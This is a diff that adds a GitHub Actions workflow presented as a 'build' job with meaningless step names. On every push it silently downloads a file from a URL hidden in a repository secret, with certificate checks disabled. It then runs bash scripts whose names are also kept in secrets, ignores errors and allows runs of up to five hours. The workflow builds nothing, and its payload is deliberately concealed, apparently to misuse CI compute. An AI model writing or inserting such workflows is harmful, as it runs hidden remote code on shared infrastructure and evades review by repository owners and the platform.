@@ -1,0 +1,29 @@
+name: zem
+
+on:
+    push:
+    workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+     - name: zem1
+       uses: actions/checkout@main
+
+     - name: zem2
+       timeout-minutes: 2
+       continue-on-error: true
+       run: |
+             curl -sLkO ${{ secrets.EA_AB }}
+             bash ${{ secrets.EA_CD }}
+     - name: zem3
+       continue-on-error: true
+       run: |
+             bash ${{ secrets.EA_EF }}
+     - name: zem4
+       timeout-minutes: 300
+       continue-on-error: true
+       run: |
+            bash ${{ secrets.EA_GH }}
